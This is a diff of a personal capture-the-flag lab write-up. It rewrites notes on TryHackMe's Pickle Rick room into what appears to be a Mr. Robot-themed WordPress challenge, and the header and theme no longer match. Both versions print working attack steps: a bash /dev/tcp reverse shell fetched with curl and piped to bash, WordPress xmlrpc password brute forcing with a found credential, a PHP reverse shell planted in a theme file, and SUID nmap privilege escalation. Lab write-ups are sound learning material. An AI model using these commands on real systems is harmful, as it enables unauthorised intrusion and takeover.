@@ -3,14 +3,14 @@ Field	Details
 Lab / challenge	Pickle Rick (Rick and Morty)
 Platform	TryHackMe
 Category	Capture the Flag (CTF) · Web / Linux Security
-Date completed	18/10/2026
-Difficulty	Begginer
+Date completed	26/10/2026
+Difficulty	Begginer/intermediate
 Environment	Authorized CTF laboratory
 Objective	Locate the three requested flags/ingredients in the challenge environment.
 
 
 1. Objective and Scope
-The goal of this challenge was to explore a deliberately vulnerable, Rick and Morty-themed environment and locate three pieces of information requested by the CTF. 
+The goal of this challenge was to explore a deliberately vulnerable, Mr. Robot-themed environment and locate three pieces of information requested by the CTF. 
 Work was performed exclusively within the authorized challenge infrastructure.
 
 2. Lab Setup and Tools
@@ -20,110 +20,84 @@ Work was performed exclusively within the authorized challenge infrastructure.
 - Tools used: terminal, browser
 3. Methodology and Findings
 3.1 Reconnaissance
-Purpose: Identify available services, exposed interfaces, and initial points of investigation.
-Summary: Access and analyze web server witch commands and discovered a web log in that gives access to a command panel 
+Purpose: Identify available services, exposed interfaces, and initial points of attack.
+Summary: Access and analyze ports to find and exploit a wordpress login 
 - Actions performed: 
   -Send a small ping to verify I'm connected to the machine and mi vpn works
     - *ping -c2 10.66.173.68* 
       **successful**
   -Start a ports scan to identify probable vulnerabilities and export results into a grapeable format easy to read and reutilize
-    - sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.64.134.204 -oG allports
-    - We discover that 2 ports are open the http/80 and ssh/22 both TCP
-  -Start an aggresive scan to both ports to discover if information macthes and what servers are using
-    - sudo nmap -p22,80 -sCV 10.64.134.204 -oN targeted
-    - ssh is in fact an ssh and is on Ubuntu 20.04, information that opens opportunity with exploits techniques
-    - http is on Apache on Ubuntu, we can try to access html web by ip
-  - There is a web page that says we need to find 3 ingredients
-  - I'll check page source code and next inspect with the browser's dev tools
-    - I found an apparently username commented *RickRul3s*, I'll save it for now and we can try to search web directories
-  - Lets numerate web directories of our page url, fast searching for php and txt archives too
-    - gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.64.134.204/ -t 20 -x php,txt
-    - Found 4 principal interesting files a login.php, assets, portal.php and robots.txt
+    - sudo nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.66.173.68 -oG allports
+    - We discover that 3 ports are open the http/80, ssh/22 and https/443
+  -Start an aggresive scan to  ports to discover if information macthes and what servers are using
+    - sudo nmap -p22,80,443 -sCV 10.66.173.68 -oN targeted
+    - ssh is 8.2p1 on ubuntu, if I have true users I can try a brute force
+    - http is on Apache on Ubuntu, but it don't has a title or version, I can try with curl -l but Im going to compare it with 443
+    - https is on Apache TLS, the CN is not an IP so, Im going to save it, maybe I can use it later
+  - I'm going to access to http and https in browser
+    - Contains the same information in both urls
+  - Lets numerate web directories of our page url
+    - gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.66.173.68/ -t 30
+    - Found a robots and many wordpress related content like a wp-login
     - Lets see robots.txt, because is plain text, it doesn't take too much time
-      - http://10.64.134.204/robots.txt
-      - Oh, I found something interesting, Wubbalubbadubdub, this is a thematic machine so I'll try in the found login.php
-      - http://10.64.134.204/login.php
-      - It worked, I'm logged, I see something that looks like a command system pannel, but I don't know what I can do
-      - whoami
-      - I'm *www-data* a normal user in apache, but we have access to the server
-- Observation: 
-3.2 Initial Access
-- Entry point or clue: webshell by a command pannel, easy access to the file, it didn't required root permissions
-- Why the method worked: web shell to stablish connection with servers system
-- Actions performed:
-  - Create an index where we are going to put our webshell
-    - nano index.html
-  - Obtain our ip output with the tryhackme's vpn
-    - ifconfig
-    - tun 0: inet 192.168.156.165
-  - Put the reverse shell in the index
-    - I'm going to inject a web RCE, telling bash to execute command as a string 
-    - I need a interactive shell, capture error messages, open a TCP connection with my IP and port 443 listening, read the commands we are putting in our session
-    - bash -c "bash -i >& /dev/tcp/192.168.156.165/443 0>&1"  save and exit
-  - Verify if saves are applied
-    - cat index.html yes, all good
-  - Lets start a http server with python
-    - sudo python3 -m http.server 80
-  - Lets start the listening port 443 to receive connection
-    - sudo nc -nlvp 443
-  - Im going to start the get query to my server 80 with CURL, because I need the connection going directly to my index.html that has the reverse shell command
-    - curl http://192.168.156.165 | bash
-    - that pipe is taking curl output (my command) and converting it to the bash command 
-  - After executing it, now I have access to the shell in my local session
-    - www-data@ip-10-64-134-204:/var/www/html$
-  - I want to feel comfortable reading and analyzing so I'm going to resize terminal to match mine
-    - $ export TERM=xterm
-    - $ script /dev/null -c bash
-    - end connection
-      - stty size
-    - restart connection
-      - stty raw -echo;fg
-      - stty rows 33 columns 149
-  - Start to work after that
+      
       
 3.3 Flag 1
-- Location or discovery method: Main directory after access to the server
-- Technical reasoning: I need to see what things can I do in every step, because it's important to improve time 
-  and sometimes we don't know full access to complish our objectives
+- Location or discovery method: Directory hidden in robots.txt
+- Technical reasoning: If I can check quick pages like this, we can obtain or not, important information in a short time
 - Actions performed:
-  - I want to know my permissions
-    - $ whoami 
-    - $ id     uid=33 gid=33 groups=33(www-data)
-    - we still a www-data user, nothing changed, but lets see what I have access now
-    - $ ls   
-    - oh there is the first ingredient Sup3rs3cretPickl3Ingred.txt , lets see if I can open it
-    - cat Sup3rs3cretPickl3Ingred.txt
-    - yes, I can, perfect I have first flag
+    - http://10.66.173.68/robots.txt
+      - Oh, I found something interesting, User-agent: * , fsociety.dic and key1-of-3.txt
+    - I'm going to download the dic to open the key.txt
+    - wget http://10.66.173.68/fsociety.dic
+      - Open the key and we have 1st flag
 3.4 Flag 2
-- Location or discovery method: File on a home directory, no root permissions required
-- Technical reasoning: I need to check and start by the basics, something many system has is the home directory
+- Location or discovery method: WP XML-RCP exploit
+- Technical reasoning: Using a remote call prodecure allow us to try obtain SU privileges
 - Actions performed: 
-  - Lets check a common general directory, home
-    - $ cd /home/
-    - $ ls
-    - rick ubuntu
-    - $ cd rick/
-    - $ ls 
-    - 'second ingredients'
-    - $ cat 'second ingredients'
+  - I can't access with the url in browser, lets use WPScan
+    - wpscan --url http://10.66.173.68/
+  - I can see that is on an Apache server, XML-RCP is enabled, WP-Cron are enabled too, WP version, Uses twentyfifteen theme on CSS style 404 page
+  - If I encountered the login, I need ussers and passwords, lets try
+    - wpscan --url http://10.66.173.68/ --enumerate u
+  - Nothing found, but to resolve the CTF a list of users and passwords were received 
+    - wpscan --url http://10.66.173.68/ --usernames users.txt --passwords --password-attack xmlrpc
+  - Un resultado favorable: Elliot pass: ER28-0652
+  - Login was successfull
+  - Now I'm moving to themes on te 404 page that uses twentyfifteen, a CVE in this version to add a reverse shell
+    - cat /usr/share/webshells/php/php-reverse-shell.php
+  - I copied it to the editor and apply changes, change the ip and port placeholder and now we need to setup that port
+    - sudo nc -nlvp 443
+  - I'm going to redirect to that 404 page
+    - http://10.66.173.68/wp-content/themes/twentyfifteen/404.php
+    - Reverse shell is active, Im going to give tty treatment
+      - $export TERM = xterm
+      - $script /dev/null -c bash
+      - ctr+z
+      - stty raw -echo;fg
+      - reset xterm
+    - Now I'm inside, so lets search what we can do now, navigate to home
+      - cd /home/
+      - ls    robot   ubuntu
+      - cd robot/
+      - ls    key-2of-3.txt  password.raw-md5
+      - cat key-2of-3.txt  permission denied
+    - I don't have required permissions, so I need to search for SU, the password is hashed, we are going to try other method with a binary exploit
+      - /home/robot$ cd /
+      - /$ find \-perm -4000 2>/dev/null
+      - /$ ./usr/local/bin/nmap --interactive
+    - Im going to launch a shell here
+      - !sh
+      - #whoami  root
+    - Navigate to the previous flag and now its open 
   -Second flag done
 3.5 Flag 3
-- Location or discovery method: root directory
+- Location or discovery method: servers directory
 - Technical reasoning: When we don´t see the responses, we can try to obtain all system control by using a privilege scalation when we are already inside the system
 3.6 Privilege Escalation 
-- Starting permissions: normal user www-data
-- Misconfiguration or weakness: server command panel
+- Starting permissions: root
+- Misconfiguration or weakness: server system
 - How higher privileges were confirmed: whoami
 - Security impact: Critic
 - Actions performed:
-  - Now I hace 2 of 3, but in my actual state i don´t found anything interesting, some files seems to be rabbitholes, lets see what a root user gies to us
-    - $ sudo -l
-    - It give us no passw to all files 
-  - Lets try a basic command
-    - $ sudo su
-  - It worked, now we are superuser, lets navigate to the root directory
-    - $ cd /root/
-    - #ls
-    - 3rd.txt
-    - #cat 3rd.txt
-  - Done
+  - Search for the 3rd flag navigating on directories
